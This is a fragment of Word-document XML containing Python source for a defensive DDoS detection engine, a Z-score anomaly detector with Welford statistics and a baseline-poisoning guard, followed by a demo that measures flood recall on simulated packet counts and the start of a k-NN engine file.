      </w:r>
    </w:p>
    <w:p w14:paraId="0ECF9D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"""Theoretical ceiling on the z-score of one outlier: (n-1)/sqrt(n)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDD17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 = len(self.history)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D5905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 &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0F3F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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0CD8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(n - 1) / math.sqrt(n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E8F173" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6383AE1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online update -------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBA254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update(self, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79352A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self.history.append(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A0C7B7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E1A5B3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Welford incremental update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142A65D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self.count += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39918B3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delta = packet_count - self.w_mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F95EFC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self.w_mean += delta / self.count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561D883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self.w_m2 += delta * (packet_count - self.w_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46000378" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0991E9B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packet_count &gt; self.peak:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC0B4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self.peak = packet_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DF3EF7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="237F4A7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calculate_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6558B50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"""Rolling-window mean and population standard deviation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1725F3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len(self.history) &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ED49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0.0, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2A8248" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48D4CD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data = list(self.history)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DCEDC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 = len(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049A1D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mean = sum(data) / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275CDCF9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30960F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population variance (we want the actual spread, not a sample estimate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E53E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var = sum((x - mean) ** 2 for x in data) / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A1C4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mean, math.sqrt(var)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EF793D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="760B0E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welford_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212F751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"""Session-wide mean and population standard deviation, O(1) memory."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AAB45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self.count &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D62D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self.w_mean, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9E44E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self.w_mean, math.sqrt(self.w_m2 / self.count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C7159C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2494CF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z_of(self, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEA16F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"""Z = (x - mu) / sigma against the rolling baseline."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7F6F3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mean, std = self.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DABCC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std &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37897E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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C5FA2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(packet_count - mean) / std</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361A1F87" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23385FD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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C0FD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analyse(self, packets_per_second, update=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB93F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"""Score an observation against the baseline, then update it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCEB881" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="688929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Two corrections to the naive estimator are applied here, and together</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7102FD6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they are what lifts flood recall:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABFAD90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="467224A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 Predict-then-update. The observation is scored against the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F6305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*as it stood before the observation arrived*. Folding the sample in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A8EFC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first inflates the mean and the standard deviation with the very</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A03FA1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spike being measured, capping any single outlier at (n-1)/sqrt(n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559E18C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and hiding genuine floods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2A3F26" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48C564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2. Baseline poisoning guard. An observation judged anomalous is not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579A53F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admitted into the baseline. Without this, a sustained flood is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569480F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absorbed within `window_size` seconds: the mean climbs to attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A23D00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volume, the z-score decays to zero and the alert silently stops</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF090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while the attack is still running. This failure mode is the direct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D1730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cause of the low flood recall reported for the naive estimator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633750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C1540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mean, std = self.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36661AE7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0622E7B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warm = len(self.history) &gt;= self.MIN_WARMUP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0420ECA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z = (packets_per_second - mean) / std if std &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E23252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statistical_anomaly = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2554E6E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warm and std &gt; 0 and z &gt; self.threshold)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452B7D3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volume_candidate = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306EA7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statistical_anomaly and packets_per_second &gt;= self.min_pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2009A1EA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C954B9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volume_candidate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7682124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self.anomaly_streak += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77035A7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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B2AE6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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD93BD3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BD8CD0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is_threat = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773EEC1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volume_candidate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F451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and self.anomaly_streak &gt;= self.required_consecutive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE679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new_threat = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACD4F1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volume_candidate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715F44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and self.anomaly_streak == self.required_consecutive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDE3499" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D94B54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Keep genuine high-volume candidates out of the baseline while their</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFC8EE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persistence is being confirmed. Low-volume statistical changes are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70035A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normal operating drift and must be allowed to update the baseline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA4B95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update and not (volume_candidate and self.guard_baseline):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096812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self.update(packets_per_second)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A82EE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elif volume_candidate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671B46F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self.suppressed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7ECB8D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="475394D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map z onto 0..1 so the risk scorer has a confidence signal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8129C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confidence = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322BDF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min(1.0, abs(z) / (self.threshold * 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5834A9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volume_candidate and std &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7749875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ADB11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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2134271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"DDoS" if is_threat else "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CD89C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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302C90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detail={"z_score": round(z, 4), "mean": round(mean, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BE066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"std_dev": round(std, 4), "pps": packets_per_second,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D08D6B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"warm": warm, "baseline_samples": len(self.history),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07220BE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"statistical_anomaly": statistical_anomaly,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402EE26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"volume_candidate": volume_candidate,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B0423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"min_pps": self.min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E905A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"anomaly_streak": self.anomaly_streak,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238BCBE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"required_consecutive": self.required_consecutive,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451A927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"new_threat": new_threat},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2771E3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is_threat=is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573F0F5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93D5594" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3108CCB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train(self, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A3041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"""Warm the baseline from an iterable of packets-per-second values."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE0BE3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seen = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71EF53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value in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05579CF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isinstance(value, (list, tuple)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2DE76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value = value[0]        # tolerate (pps, label) rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351255C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self.update(float(value))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7239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seen += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081939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mean, std = self.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB8A6E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print("[ZS ] %d observations mean=%.2f std=%.2f peak=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E6C00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(seen, mean, std, self.peak))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3761D8E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{"samples": seen, "mean": mean, "std_dev": std, "peak": self.peak}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCA381C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BD7542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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC334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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B599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"window_size": self.window_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECB1CA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"threshold": self.threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0117CFE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"guard_baseline": self.guard_baseline,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099057B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"min_pps": self.min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0180FBA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"required_consecutive": self.required_consecutive,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4390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"count": self.count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570571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"mean": self.w_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E0FE7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"m2": self.w_m2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008E09F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"peak": self.peak,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64205B0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"history": list(self.history),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485145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0D50422" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="370C78B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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747F37A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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F87E1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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD2B89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Restore learned observations, but keep the current runtime policy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FF9F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authoritative. Otherwise an old brain file silently overrides newer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A99C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CLI/config values such as threshold, window, and minimum PPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF05F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self.count = int(data.get("count", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128B955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self.w_mean = float(data.get("mean", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FED62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self.w_m2 = float(data.get("m2", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F638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self.peak = int(data.get("peak", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D462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self.history = collections.deque(data.get("history", []),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED821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maxlen=self.window_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1482D2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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DA18A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State import: Z-Score restored baseline "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF0D9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"(mean=%.2f over %d observations)." % (self.w_mean, self.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E7D3F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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BAA941" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03FC01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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C8B78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self.history.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3035E0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self.count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E03D6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self.w_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1458CCE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self.w_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB9004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self.peak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4D49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self.suppressed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090FC15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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7A1F5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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341157E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1865DFBC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1744E63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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4940D1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baseline_traffic = [10, 12, 11, 10, 13, 9, 11, 12, 10, 11]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B7CF4E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6498C2C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 = MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5375CF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pps in baseline_traffic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699F54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s.update(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206694B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wm, wsd = s.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A62F41D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="613BBDA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Welford must agree with the textbook two-pass formula</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE75D3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mean = sum(baseline_traffic) / len(baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F03E5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ref = math.sqrt(sum((x - mean) ** 2 for x in baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9408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len(baseline_traffic))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0619534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print("welford  mean=%.4f std=%.4f" % (wm, wsd))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149DAC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print("two-pass mean=%.4f std=%.4f  (delta=%.2e)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFC24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(mean, ref, abs(ref - wsd)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0711E4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print("max detectable z for a single outlier (n=%d): %.3f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5479ADC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(len(s.history), s.max_detectable_z))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0D23E7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="222748F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 sustained 60-second flood: how many seconds does each variant catch?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5827ACE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flood = [8000] * 60</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052042E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print("\nsustained flood of %d seconds at 8000 pps" % len(flood))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B45C5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guarded in (False, True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F47FC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 = MinimalistStats(window_size=10, threshold=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A42F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guard_baseline=guarded)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CCEF4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eng.train(baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51034C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caught = sum(1 for pps in flood if eng.analyse(pps).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069709A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guard_baseline=%-5s -&gt; detected %2d/%d seconds (recall %.2f)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5AF34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(guarded, caught, len(flood), caught / len(flood)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B331AC6"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src/engines/knn.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1296D1B5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>261 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF7D3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import math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448A671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from collections import Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA1D372" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37397A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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330D3DE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from engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0CFC0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except ImportError:  # allow `python engines/knn.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732D26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from base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262FCE06" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12FF8670" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
